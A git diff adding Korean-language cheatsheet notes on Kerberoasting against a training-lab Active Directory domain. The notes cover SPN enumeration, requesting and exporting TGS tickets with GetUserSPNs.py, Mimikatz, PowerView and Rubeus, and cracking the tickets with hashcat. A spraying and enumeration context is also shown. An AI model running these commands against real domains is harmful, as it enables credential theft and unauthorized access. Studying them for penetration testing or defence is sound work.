@@ -339,7 +339,7 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 | `wmic group list /format:list`                                                       | 모든 지역 그룹에 대한 정보                              |
 | `wmic sysaccount list /format:list`                                                  | 서비스 계정으로 사용되는 모든 시스템 계정에 대한 정보를 덤프합니다.       |
 
-[WMI Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)
+[WMI Cheatsheet](https://gist.github.com/xorrior/67ee741af08cb1fc86511047550cdaf4)<br/>
 ```wmic ntdomain get Caption,Description,DnsForestName,DomainName,DomainControllerAddress```
 
 ### Net 명령
@@ -386,7 +386,82 @@ Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorActio
 <br/><br/>
 ## 11. Kerberoasting - from Linux
 
+### GetUserSPNs.py로 SPN Accounts 나열
+```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend```
 
+### 모든 TGS Tickets 요청
+```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request```
 
+### 단일 TGS ticket 요청
+```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev```
 
+### TGS Ticket을 출력 파일에 저장
+```GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user sqldev -outputfile sqldev_tgs```
+
+### Hashcat으로 오프라인 Ticket Cracking
+```hashcat -m 13100 sqldev_tgs /usr/share/wordlists/rockyou.txt```
+
+### 도메인 컨트롤러에 대한 인증 테스트
+```sudo crackmapexec smb 172.16.5.5 -u sqldev -p database!```
+
+<br/><br/>
+## 12. Kerberoasting - from Windows
+
+### setspn.exe로 SPN 열거
+```setspn.exe -Q */*```
+
+### 단일 사용자 타겟팅
+```
+Add-Type -AssemblyName System.IdentityModel
+New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"
+```
+
+### setspn.exe를 사용하여 All Tickets 검색
+```setspn.exe -T INLANEFREIGHT.LOCAL -Q */* | Select-String '^CN' -Context 0,1 | % { New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $_.Context.PostContext[0].Trim() }```
+
+### Mimikatz를 사용하여 메모리에서 티켓 추출
+```
+mimikatz # base64 /out:true
+mimikatz # kerberos::list /export
+```
+
+### Cracking을 위한 Base64 Blob 정리 (줄바꿈, 공백 제거)
+```echo "<base64 blob>" |  tr -d \\n```
+
+### base64 출력을 .kirbi 파일로 변환
+```cat encoded_file | base64 -d > sqldev.kirbi```
+
+### kirbi2john.py를 사용하여 Kerberos Ticket 추출
+```python2.7 kirbi2john.py sqldev.kirbi```
+
+### Hashcat을 사용하기 위해 파일 수정
+```sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat```
+
+### Hashcat으로 Cracking
+```hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt```
+
+### TGS Tickets 추출을 위한 PowerView 사용
+```
+Import-Module .\PowerView.ps1
+Get-DomainUser * -spn | select samaccountname
+```
+
+### 특정 사용자 타켓을 위한 PowerView 사용
+```Get-DomainUser -Identity sqldev | Get-DomainSPNTicket -Format Hashcat```
+
+### 모든 Ticket을 CSV 파일로 내보내기
+```Get-DomainUser * -SPN | Get-DomainSPNTicket -Format Hashcat | Export-Csv .\ilfreight_tgs.csv -NoTypeInformation```<br/>
+```cat .\ilfreight_tgs.csv```
+
+### Rubeus 사용하여 통계 수집 (/stats 플래그)
+```Rubeus.exe kerberoast /stats```
+
+### 오프라인 cracking을 위한 명령 (admincount 속성 1, /nowrap 플래그)
+```Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap```
+
+### 특정 사용자 Ticket 수집
+```Rubeus.exe kerberoast /user:testspn /nowrap```
+
+### 특정 사용자 Ticket 수집 (RC4 암호화만 원할 때, /tgtdeleg 플래그)
+```Rubeus.exe kerberoast /tgtdeleg /user:testspn /nowrap```
 
